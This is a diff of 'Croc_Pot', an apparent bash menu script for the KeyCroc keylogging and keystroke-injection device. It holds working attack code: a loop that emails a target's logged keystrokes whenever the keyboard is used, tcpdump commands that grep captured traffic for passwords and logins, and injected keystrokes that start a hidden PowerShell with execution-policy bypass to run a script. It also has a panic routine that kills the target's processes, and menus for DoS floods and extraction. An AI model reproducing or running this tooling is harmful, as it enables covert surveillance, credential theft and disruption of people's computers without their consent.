 #----Panic button press [P] in any menu will close all application and open login screen
@@ -626,43 +706,39 @@ function Panic_button() {
 	echo -ne "#!/bin/bash\nPID_WPA=\$(pidof wpa_supplicant)\nPID_DHC=\$(pidof dhclient)\nsleep 60\nifconfig wlan0 up\nkill -9 \$PID_WPA && kill -9 \$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0\nLED B\n" > /tmp/reset_net.txt
 	chmod +x /tmp/reset_net.txt
 	ColorRed '\n\nPanic button was pressed\nClosing all application opening login screen\nKilling wlan0 interface\nExit Croc_Pot\nRestore wlan0 interface in 1 min or unplug keycroc and plug back in\n\n'
+	ifconfig wlan0 down ; bash /tmp/reset_net.txt &
 	if [ "$(OS_CHECK)" = WINDOWS ]; then
-		ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
-		Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE ; Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE
-		Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE ; Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE
-		Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE ; Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE
-		Q ENTER ; Q GUI-l
-		exit
+		QUACK GUI r ; sleep 2
+		QUACK STRING "powershell Stop-Process -Name explorer ; Shutdown.exe /l /f"
+		QUACK ENTER
 	elif [ "$(OS_CHECK)" = LINUX ]; then
-		case "$HOST_CHECK" in
-		raspberrypi)
-			ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-F4 ; Q CONTROL-ALT-F3
-			exit ;;
-		"$HOST_CHECK")
-			ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-F4 ; Q GUI-l ; sleep 1 ; Q KEYCODE 00,00,2c
-			exit ;;
-		*)
-			ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
-			Q ALT-F4 ; Q CONTROL-ALT-F3
-			exit ;;
-		esac
+		if [ "$HOST_CHECK" = raspberrypi ]; then
+			QUACK CONTROL-ALT-d ; QUACK CONTROL-ALT-t ; sleep 1
+			QUACK STRING "if [[ \$(uname) == \"Darwin\" ]]; then processes=\$(ps -axo comm | sed 1d); else processes=\$(ps -A -o comm=); fi; for p in \$processes; do if [[ \"\$p\" != \"bash\" && \"\$p\" != \$\$ ]]; then killall \"\$p\"; fi; done"
+			QUACK ENTER
+		elif [ "$HOST_CHECK" = "$HOST_CHECK" ]; then
+			QUACK CONTROL-ALT-d ; QUACK ALT-t ; sleep 1
+			QUACK STRING "if [[ \$(uname) == \"Darwin\" ]]; then processes=\$(ps -axo comm | sed 1d); else processes=\$(ps -A -o comm=); fi; for p in \$processes; do if [[ \"\$p\" != \"bash\" && \"\$p\" != \$\$ ]]; then killall \"\$p\"; fi; done"
+			QUACK ENTER
+		else
+			QUACK ALT-F4 ; QUACK ALT-F4 ; QUACK ALT-F4 ; QUACK ALT-F4
+			QUACK GUI-l ; QUACK CONTROL-ALT-F3
+		fi
 	else
-		ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
-		Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE
-		Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER ; Q GUI-l ; Q CONTROL-ALT-F3
-		exit
+		QUACK ALT-F4 ; QUACK ALT-F4 ; QUACK ALT-F4 ; QUACK ALT-F4
+		QUACK GUI-l ; QUACK CONTROL-ALT-F3
 	fi
+	exit
+}
+##
+#----Lock and unlock keyboard with QUACK LOCK and QUACK UNLOCK command
+##
+function Lock_keyboard() {
+	printf '\033[H\033[2J'
+	QUACK LOCK
+	Countdown 1 15 Keyboard locked out
+	QUACK UNLOCK
+	ColorYellow "Keyboard has been restored\033[0K\r"
 }
 ##
 #----KeyCroc Log mean/function
@@ -697,9 +773,10 @@ function croc_logs_menu() {
 		12) ColorYellow "\t$LINE_ ALTERNATIVES_LOG $LINE_" ; sleep 2 ; less /var/log/alternatives.log ; sleep 0.5 ; croc_logs_menu ;;
 		13) ColorYellow "\t$LINE_ MAIL_INFO_LOG $LINE_" ; sleep 2 ; less /var/log/mail.info ; sleep 0.5 ; croc_logs_menu ;;
 		14) ColorYellow "\t$LINE_ DAEMON_LOG $LINE_" ; sleep 2 ; less /var/log/daemon.log ; sleep 0.5 ; croc_logs_menu ;;
-		15) ColorYellow "\t$LINE_ KEYSTROKES_LOG $LINE_" ; sleep 2 ; less /root/udisk/loot/croc_char.log ; sleep 0.5 ; croc_logs_menu ;;
+		15) ColorYellow "\t$LINE_ KEYSTROKES_LOG $LINE_" ; sleep 2 ; find . -type f -name "croc_char.log" -exec cat {} + ; sleep 0.5 ; croc_logs_menu ;;
 		16) main_menu ;;
 		0) exit ;; 
+		lock) Lock_keyboard ; croc_logs_menu ;;
 		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; croc_logs_menu ;;
 	esac
 }
@@ -729,6 +806,7 @@ user_smtp() {
 		2) echo "smtp-mail.outlook.com" >> "$USER_CR" ;;
 		3) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; user_smtp ;;
 		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; user_smtp ;;
 	esac
 }
@@ -773,8 +851,12 @@ send_all_file() {
 #----Mail user enter path to Attachment Function
 ##
 send_file_e() {
-	cd / ; for i in ls -d /*; do g="$(find ./"$i" -type f -print | wc -l)"
-	ColorYellow "Directory:$(ColorCyan " $i ")$(ColorYellow 'Contains:')$(ColorGreen " $g ")$(ColorYellow 'files.')\n"; done 2>/dev/null
+	for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
+		count=$(find "/$dir" -type f 2>/dev/null | wc -l)
+		if [ $? -eq 0 ]; then
+			ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
+		fi
+	done
 	read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
 	f="$(find /"$r_f" -type f -name "*")" ; ColorGreen "$f\n"
 	read_all 'ENTER THE PATH TO ATTACHMENT AND PRESS [ENTER]' ; s_a="$r_a"
@@ -823,6 +905,7 @@ send_log_f() {
 		6) send_all_file /root/udisk/loot/croc_char.log F CROC CHAR LOG ;;
 		0) exit ;;
 		7) main_menu ;;
+		lock) Lock_keyboard ; mail_file ;;
 		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; mail_file ;;
 	esac
 }
@@ -936,27 +1019,21 @@ fi
 	esac
 python_email & displaySpinner Please wait...
 ##
-#----Mail send e-mail alert when keyboard is activated
+#----Mail send live keystrokes to e-mail when keyboard is activated
 ##
-	Info_Screen '-Any keyboard activity will send a E-mail alert and one file
+	Info_Screen '-Any keyboard activity will send a E-mail
 -Run Continuously in loop PRESS CTRL + C to break loop in terminal
--Send live keystroke with /tmp/livekey.txt
-install Live_Keystroke.txt payload first located in status menu
--default file will be /root/udisk/loot/croc_char.log'
-	read_all 'SEND E-MAIL ALERT Y/N AND PRESS [ENTER]'
+-Send live keystroke loot/croc_char.log'
+	read_all 'SEND LIVE KEYSTROKE Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 	[yY] | [yY][eE][sS])
 		unset MY_MESS_A
 		reset_broken
-		if [ -f "/tmp/livekey.txt" ]; then
-			local CHANGE_FILE="F"
-			local CHANGE_FILE_A="'/tmp/livekey.txt'"
-		elif [ -f "/root/udisk/loot/croc_char.log" ]; then
-			local CHANGE_FILE="F"
-			local CHANGE_FILE_A="'/root/udisk/loot/croc_char.log'"
-		fi
-		ColorYellow "Sending $CHANGE_FILE_A\n" ; sleep 2
 		while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
+			find . -type f -name "croc_char.log" -exec cat {} + > /tmp/combined_logs.txt
+			sleep 2
+			local CHANGE_FILE="F"
+			local CHANGE_FILE_A="'/tmp/combined_logs.txt'"
 			(( i++ ))
 			local MY_MESS_A=$(echo -ne "Target keyboard has been activated $(date +%b-%d-%y-%r) COUNT: $i")
 			python_v
@@ -1006,21 +1083,18 @@ tcpdump_scan() {
 	MenuEnd 24
 	case "$m_a" in
 		1) (croc_title_loot 'TCPDUMP INTERFACE SCAN' ; tcpdump -D) | tee "$LOOT_TCPDUMP" ;;
-		2) (croc_title_loot 'TCPDUMP PACKETS IN HEX AND ASCll' ; tcpdump -XX -i any) | tee "$LOOT_TCPDUMP" ;;
-		3) (croc_title_loot 'TCPDUMP PACKETS WITH IP ADDRESS' ; tcpdump -n -i any) | tee "$LOOT_TCPDUMP" ;;
+		2) (croc_title_loot 'TCPDUMP PACKETS IN HEX AND ASCll' ; tcpdump -XX -i wlan0) | tee "$LOOT_TCPDUMP" ;;
+		3) (croc_title_loot 'TCPDUMP PACKETS WITH IP ADDRESS' ; tcpdump -n -i wlan0) | tee "$LOOT_TCPDUMP" ;;
 		4) (croc_title_loot 'TCPDUMP CURRENT NETWORK INTERFACE' ; tcpdump) | tee "$LOOT_TCPDUMP" ;;
-		5) croc_title_loot 'TCPDUMP CHECK HOST COMMUNICATION' | tee "$LOOT_TCPDUMP" ; read_all 'ENTER IP AND PRESS [ENTER]' && (tcpdump -i any src host "$r_a") | tee -a "$LOOT_TCPDUMP" ;;
-		6) (croc_title_loot 'TCPDUMP TCP PACKET HTTP REQUEST'
-			tcpdump -i any port http
-			tcpdump -i any port 80
-			tcpdump -A -s 1492 dst port 80 or -A -s 1492 src port 80
-			tcpdump -i any port http or port smtp or port imap or port pop3 -l -A | grep -E -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|userna me:|password:|login:|pass |user ') | tee "$LOOT_TCPDUMP" ;;
-		7) (croc_title_loot 'TCPDUMP PACKET OF TCP,UDP,ICMP' ; tcpdump -i any -n -v tcp or udp or icmp and not port 22) | tee "$LOOT_TCPDUMP" ;;
-		8) (croc_title_loot 'TCPDUMP HOST HEADER HTTP' ; tcpdump -i any -n -s 0 -w - | grep -a -o -E --line-buffered "GET \/.*|Host\: .*") | tee "$LOOT_TCPDUMP" ;;
-		9) (croc_title_loot 'TCPDUMP DNS QUERY REQUEST' ; tcpdump -i any 'udp port 53') | tee "$LOOT_TCPDUMP" ;;
+		5) croc_title_loot 'TCPDUMP CHECK HOST COMMUNICATION' | tee "$LOOT_TCPDUMP" ; read_all 'ENTER IP AND PRESS [ENTER]' && (tcpdump -i wlan0 src host "$r_a") | tee -a "$LOOT_TCPDUMP" ;;
+		6) (croc_title_loot 'TCPDUMP TCP PACKET HTTP REQUEST' ; tcpdump -i wlan0 -n -w /tmp/capture.pcap 'port http or port 80 or (dst port 80 or src port 80) and (port http or port smtp or port imap or port pop3)' -G 300 -s 0 && grep -E -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|userna me:|password:|login:|pass |user' -a -B 30 -r /tmp/capture.pcap -l) | tee "$LOOT_TCPDUMP" ;;
+		7) (croc_title_loot 'TCPDUMP PACKET OF TCP,UDP,ICMP' ; tcpdump -i wlan0 -n -v tcp or udp or icmp and not port 22) | tee "$LOOT_TCPDUMP" ;;
+		8) (croc_title_loot 'TCPDUMP HOST HEADER HTTP' ; tcpdump -i wlan0 -n -s 0 -w - | grep -a -o -E --line-buffered "GET \/.*|Host\: .*") | tee "$LOOT_TCPDUMP" ;;
+		9) (croc_title_loot 'TCPDUMP DNS QUERY REQUEST' ; tcpdump -i wlan0 'udp port 53') | tee "$LOOT_TCPDUMP" ;;
 		10) croc_title_loot 'ENTER TCPDUMP SCAN' | tee "$LOOT_TCPDUMP" ; read_all 'ENTER TCPDUMP SCAN THEN AND PRESS [ENTER]' && "$r_a" | tee -a "$LOOT_TCPDUMP" ;;
 		11) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ;;
 		[pP]) Panic_button ;; [bB]) croc_recon ;; *) invalid_entry ;;
 	esac
 }
@@ -1029,10 +1103,10 @@ tcpdump_scan() {
 ##
 nmap_menu() {
 	Info_Screen '-Start some basic nmap scan and save to Loot/Croc_Pot folder
--Enter IP for scan or default will be target pc ip'
+-Enter IP for scan or default will be target ip'
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
 ##
-#----Nmap User enter IP for scan (default target pc) 
+#----Nmap User enter IP for scan (default target) 
 ##
 user_ip_f() {
 	read_all 'ENTER IP TO USE FOR NMAP SCAN AND PRESS [ENTER]'
@@ -1040,20 +1114,18 @@ user_ip_f() {
 		IP_SETUP="$r_a"
 		ColorGreen "USING IP THAT WAS ENTER $r_a"
 	else
-		ColorRed "USING TARGET PC IP $(os_ip)\n"
+		ColorRed "USING TARGET IP $(os_ip)\n"
 		IP_SETUP=$(os_ip)
 	fi
 	}
 ##
-#----Regular nmap scan on Target Pc
+#----Regular nmap scan on Target
 ##
-pc_scan() {
-	if [ "$(OS_CHECK)" = WINDOWS ]; then
-		(croc_title_loot "NMAP TARGET PC SCAN: $(OS_CHECK)" ; nmap "$(os_ip)") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait...
-	elif [ "$(OS_CHECK)" = LINUX ]; then
-		(croc_title_loot "NMAP TARGET PC SCAN: $(OS_CHECK)" ; nmap "$(os_ip)") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait...
+target_scan() {
+	if [ "$(os_ip)" =~ $validate_ip ]; then
+		(croc_title_loot "NMAP TARGET SCAN: $(OS_CHECK)" ; nmap "$(os_ip)") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait...
 	else
-		ColorRed 'PLEASE RUN CROC_POT_PAYLOAD.txt TO GET TARGET PC USER NAME AND IP\n'
+		ColorRed 'Invalid ip address\n'
 	fi
 	}
 ##
@@ -1068,7 +1140,7 @@ pc_scan() {
 	MenuColor 20 6 'INTERFACE SCAN'
 	MenuColor 20 7 'PORT SCAN'
 	MenuColor 20 8 'PERSONAL SCAN'
-	MenuColor 20 9 'TARGET PC SCAN'
+	MenuColor 20 9 'TARGET SCAN'
 	MenuColor 19 10 'RETURN TO MAIN MENU'
 	MenuEnd 19
 	case "$m_a" in
@@ -1080,9 +1152,10 @@ pc_scan() {
 		6) (croc_title_loot 'NMAP INTERFACE SCAN' ; nmap --iflist) | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
 		7) user_ip_f ; (croc_title_loot 'NMAP PORT SCAN' ; nmap --top-ports 20 "$IP_SETUP") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
 		8) croc_title_loot 'NMAP PERSONAL SCAN' | tee "$LOOT_NMAP" ; read_all 'ENTER PERSONAL NMAP SCAN SETTINGS AND PRESS [ENTER]' && "$r_a" | tee -a "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
-		9) pc_scan ;;
+		9) target_scan ;;
 		10) main_menu ;;
 		0) exit 0 ;;
+		lock) Lock_keyboard ;;
 		[pP]) Panic_button ;; [bB]) croc_recon ;; *) invalid_entry ;;
 	esac
 }
@@ -1156,7 +1229,7 @@ target_port() {
 			read_all 'ENTER PORT RANGE FOR SCAN AND PRESS [ENTER]' ; range_port="$r_a"
 			reset_broken
 			for (( PORT = 1; PORT < range_port; ++PORT )); do
-				nc -z -w 1 "$n_ip" "$PORT" &>"/dev/null"
+				nc -vz -w 1 "$n_ip" "$PORT" &>"/dev/null"
 				if [ $? -eq 0 ]; then
 					ColorGreen "Open port $PORT$clear\033[0K\r\n"
 				elif [ "$broken" -eq 1 ]; then
@@ -1297,119 +1370,6 @@ check_internet_connection() {
 	print_servers "conclusion"
 }
 ##
-#----Recon check e-mail leak test
-##
-email_leak() {
-	Info_Screen '-E-mail IP leak test
--Author: macvk https://github.com/macvk/emailleaktest
--Your IP can be exposed during email sending.
--The test analyzes mail headers and shows IP leaks.
--BY https://bash.ws/'
-local api_domain='bash.ws'
-local error_code=1
-increment_error_code() {
-	error_code=$((error_code + 1))
-}
-echo_bold() {
-	echo -e "$yellow$1$clear"
-}
-echo_error() {
-	(>&2 echo -e "$red$1$clear")
-}
-program_exit() {
-	command -v "$1" > /dev/null
-	if [ $? -ne 0 ]; then
-		echo_error "Please, install \"$1\""
-		$error_code
-	fi
-	increment_error_code
-}
-check_internet_connection() {
-	user_agent_random
-	curl -k -A "$userAgent" --silent --head --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
-	if [ $? -ne 0 ]; then
-		echo_error "No internet connection."
-		$error_code
-	fi
-	increment_error_code
-}
-print_servers() {
-	if (( $jq_exists )); then
-		echo "$result" | \
-		jq --monochrome-output \
-		--raw-output \
-		".[] | select(.type == \"${1}\") | \"\(.ip)\(if .country_name != \"\" and .country_name != false then \" [\(.country_name)\(if .asn != \"\" and .asn != false then \" \(.asn)\" else \"\" end)]\" else \"\" end)\""
-	else
-		while IFS= read -r line; do
-			if [[ "$line" != *${1} ]]; then
-				continue
-			fi
-			ip=$(echo "$line" | cut -d'|' -f 1)
-			code=$(echo "$line" | cut -d'|' -f 2)
-			country=$(echo "$line" | cut -d'|' -f 3)
-			asn=$(echo "$line" | cut -d'|' -f 4)
-			if [ -z "${ip// }" ]; then
-				continue
-			fi
-			if [ -z "${country// }" ]; then
-				echo "$ip"
-			else
-				if [ -z "${asn// }" ]; then
-					echo "$ip [$country]"
-				else
-					echo "$ip [$country, $asn]"
-				fi
-			fi
-		done <<< "$result"
-	fi
-}
-	program_exit curl
-	program_exit ping
-	program_exit mail
-	check_internet_connection
-	if command -v jq &> /dev/null; then
-		jq_exists=1
-	else
-		jq_exists=0
-	fi
-	if hash shuf 2>/dev/null; then
-		id=$(shuf -i 1000000-9999999 -n 1)
-	else
-		id=$(jot -w %i -r 1 1000000 9999999)
-	fi
-	if (( $jq_exists )); then
-		format="json"
-	else
-		format="txt"
-	fi
-	result=$(curl -k --silent "https://${api_domain}/email-leak-test/test/${id}?${format}")
-	mail -s "Test" "$id"@bash.ws < /dev/null > /dev/null
-	for (( ; ; )); do
-		result=$(curl -k --silent "https://${api_domain}/email-leak-test/test/${id}?${format}")
-		is_done=$(print_servers "done")
-		if [[ "$is_done" == *"1"* ]]; then
-			break
-		fi
-	done
-	echo_bold "Your IP:"
-	print_servers "ip"
-	echo ""
-	ips_count=$(print_servers "mail" | wc -l)
-	if [ "$ips_count" -eq "0" ]; then
-		echo_bold "No IPs found in mail header"
-	else
-		if [ "$ips_count" -eq "1" ]; then
-			echo_bold "Mail header has got ${ips_count} IP:"
-		else
-			echo_bold "Mail header has got ${ips_count} IPs:"
-		fi
-		print_servers "mail"
-	fi
-	echo ""
-	echo_bold "Conclusion:"
-	print_servers "conclusion"
-}
-##
 #----Recon pentmenu dos flood attack & recon scans by Chris Spillane
 ##
 pentmenu() {
@@ -1456,6 +1416,7 @@ Info_Screen "Welcome to
 		4) showreadme ; mainmenu ;;
 		5) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; mainmenu ;;
 		[pP]) Panic_button ;; [bB]) croc_recon ;; *) invalid_entry ; mainmenu ;;
 	esac
 }
@@ -1494,6 +1455,7 @@ reconmenu() {
 		8) ipsecscan ; reconmenu ;;
 		9) mainmenu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; reconmenu ;;
 		[pP]) Panic_button ;; [bB]) mainmenu ;; *) invalid_entry ; reconmenu ;;
 	esac
 }
@@ -1699,6 +1661,7 @@ dosmenu() {
 		12) nxdomainflood ; dosmenu ;;
 		13) mainmenu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; dosmenu ;;
 		[pP]) Panic_button ;; [bB]) mainmenu ;; *) invalid_entry ; dosmenu ;;
 	esac
 }
@@ -2330,6 +2293,7 @@ extractionmenu() {
 		2) listener ; mainmenu ;;
 		3) mainmenu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; extractionmenu ;;
 		[pP]) Panic_button ;; [bB]) mainmenu ;; *) invalid_entry ; extractionmenu ;;
 	esac
 }
@@ -2501,9 +2465,9 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 		start_win_stat() {
 		rm -f "$LOOT_WIND"
 		ATTACKMODE HID STORAGE
-		sleep 5 ; Q GUI r ; sleep 1 ; LED ATTACK ; Q STRING "powershell -nop -ex Bypass -w Hidden" ; Q ENTER ; sleep 5
-		Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\run.ps1')" ; Q ENTER ; sleep 45
-		Q STRING "exit" ; Q ENTER ; ATTACKMODE HID ; LED FINISH ; sleep 3
+		sleep 5 ; QUACK GUI r ; sleep 1 ; LED ATTACK ; QUACK STRING "powershell -nop -ex Bypass -w Hidden" ; QUACK ENTER ; sleep 5
+		QUACK STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\run.ps1')" ; QUACK ENTER ; sleep 45
+		QUACK STRING "exit" ; QUACK ENTER ; ATTACKMODE HID ; LED FINISH ; sleep 3
 		LED OFF
 	}
 		if [[ -e "$WIN_PS" && "$WIN_PS_A" ]]; then
@@ -2548,6 +2512,86 @@ else
 fi
 }
 ##
+#----Web crawler using bash and curl
+##
+web_crawler() {
+	Info_Screen 'Web Crawler
+-Crawls a website and prints the URLs of the pages it visits
+to the terminal.
+
+A web crawler, also known as a spider, is a program or automated
+script that systematically browses the World Wide Web, usually for
+the purpose of indexing and gathering information about websites.'
+	read_all 'START WEB CRAWLER Y/N AND PRESS [ENTER]'
+	case "$r_a" in
+		[yY] | [yY][eE][sS])
+		user_agent_random
+		read_all 'ENTER WEBSITE [https://example.com] AND PRESS [ENTER]' ; base_url="$r_a"
+		check_url=$(curl -A "$userAgent" --write-out %{http_code} --silent --output /dev/null $base_url)
+		if [ "$check_url" -eq 200 ]; then
+			visited=()
+			to_visit=("$base_url")
+			start_time=$(date +%s)
+			total_urls_visited=0
+			while [ ${#to_visit[@]} -ne 0 ]; do
+				url="${to_visit[0]}"
+				unset to_visit[0]
+				to_visit=("${to_visit[@]}")
+				if [[ "${visited[@]}" =~ "$url" ]]; then
+					continue
+				fi
+				visited+=("$url")
+				total_urls_visited=$((total_urls_visited + 1))
+				html=$(curl -s -A "$userAgent" "$url")
+				if [ $? -ne 0 ]; then
+					ColorRed "Error fetching $url\n"
+					continue
+				fi
+				links=$(echo "$html" | grep -oE "href=\"[^\"]+" | cut -d'"' -f2)
+				for link in $links; do
+					if [[ "$link" =~ "^http" ]]; then
+						to_visit+=("$link")
+					else
+						to_visit+=("$base_url$link")
+					fi
+				done
+				title=$(echo "$html" | grep -oE "<title>[^<]+" | cut -d'>' -f2)
+				description=$(echo "$html" | grep -oE "<meta name=\"description\" content=\"[^\"]+" | cut -d'"' -f4)
+				response=$(curl -s -I -A "$userAgent" "$url")
+				response_code=$(echo "$response" | grep -oE "HTTP/[0-9\.]+ [0-9]+" | cut -d' ' -f2)
+				content_type=$(echo "$response" | grep -iE "content-type:.*" | cut -d' ' -f2-)
+				last_modified=$(echo "$response" | grep -iE "last-modified:.*" | cut -d' ' -f2-)
+				ColorYellow "$total_urls_visited: $(ColorCyan "$url")\n"
+				ColorYellow "  Title: $(ColorCyan "$title")\n"
+				if [ -n "$description" ]; then
+					ColorYellow "  Description: $(ColorCyan "$description")\n"
+				fi
+				ColorYellow "  Number of links on this page: $(ColorGreen "$(echo "$links" | wc -w)")\n"
+				ColorYellow "  Size of this page: $(ColorGreen "$(echo "$html" | wc -c) bytes")\n"
+				ColorYellow "  Response code: $(ColorGreen "$response_code")\n"
+				if [ -n "$content_type" ]; then
+					ColorYellow "  Content type: $(ColorGreen "$content_type")\n"
+				fi
+				if [ -n "$last_modified" ]; then
+					ColorYellow "  Last modified time: $(ColorGreen "$last_modified")\n"
+				fi
+				current_time=$(date +%s)
+				if [ $((current_time - start_time)) -gt 30 ]; then
+					ColorRed "No response for 30 seconds, exiting\n"
+					break
+				fi
+			start_time=$(date +%s)
+			done
+		else
+				ColorRed "Website is not accessible"
+		fi ;;
+		[nN] | [nN][oO])
+			ColorYellow 'Maybe next time\n' ;;
+		*)
+			invalid_entry ;;
+	esac
+}
+##
 #----Croc_Pot_Plus Recon scan main menu
 ##
 	MenuTitle 'RECON SCAN MENU'
@@ -2561,9 +2605,9 @@ fi
 	MenuColor 21 8 'SSL/TLS SSLSCAN'
 	MenuColor 21 9 'PHONE NUMBER LOOKUP'
 	MenuColor 20 10 'DNS LEAK TEST'
-	MenuColor 20 11 'E-MAIL LEAK TEST'
-	MenuColor 20 12 'PENTMENU RECON MENU'
-	MenuColor 20 13 'WINDOWS INFO GRABBER'
+	MenuColor 20 11 'PENTMENU RECON MENU'
+	MenuColor 20 12 'WINDOWS INFO GRABBER'
+	MenuColor 20 13 'WEB CRAWLER'
 	MenuColor 20 14 'RETURN TO MAIN MENU'
 	MenuEnd 20
 	case "$m_a" in
@@ -2577,11 +2621,12 @@ fi
 		8) ssl_scan ; croc_recon ;;
 		9) phone_lookup ; croc_recon ;;
 		10) leak_dns ; croc_recon ;;
-		11) email_leak ; croc_recon ;;
-		12) pentmenu ;;
-		13) windows_check ; croc_recon ;;
+		11) pentmenu ;;
+		12) windows_check ; croc_recon ;;
+		13) web_crawler ; croc_recon ;;
 		14) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; croc_recon ;;
 		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; croc_recon ;;
 	esac
 }
@@ -2637,6 +2682,7 @@ setup_vpn() {
 		6) rm -f "$vpn_file_A" /etc/openvpn/credentials "$vpn_file" ; ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED\n' ; croc_vpn ;;
 		7) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; croc_vpn ;;
 		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; croc_vpn ;;
 	esac
 }
@@ -5086,7 +5132,6 @@ draw_line() {
 ##
 tac_toe() {
 local cell_w=10
-# horizontal line
 local line_seg="---------"
 local line="  ""$line_seg""|""$line_seg""|""$line_seg"
 local reset="\033[0m"
@@ -5299,6 +5344,7 @@ done
 		6) Heads_Tails ; pass_time ;;
 		7) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; pass_time ;;
 		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; pass_time ;;
 	esac
 }
@@ -5312,7 +5358,9 @@ run Croc_Pot_Payload.txt first to get OS detection
 
 When running payload from terminal Recommended to run on remote terminal'
 ColorYellow "CURRENTLY INSTALLED PAYLOADS: $(ColorGreen "$(ls /root/udisk/payloads | grep -c ".txt")")\n"
-ColorCyan "$(ls /root/udisk/payloads | grep ".txt")\n\n"
+for file_path in $(find "/root/udisk/payloads" -maxdepth 1 -type f); do
+	ColorCyan "\t$(basename "$file_path")$clear\n"
+done ; echo -ne "\n"
 ##
 #----Croc_Getonline Payload Function
 ##
@@ -5333,26 +5381,25 @@ getonline_R <-- MATCH word for Raspberry pi
 ##
 if [ -f "$CROC_GETONLINE" ]; then
 	cat "$CROC_GETONLINE" ; echo -ne "\n$LINE\n"
-	ColorGreen 'CROC_GETONLINE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
+	ColorGreen "CROC_GETONLINE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER$clear\n"
 else
 	read_all 'INSTALL CROC_GETONLINE PAYLOAD Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
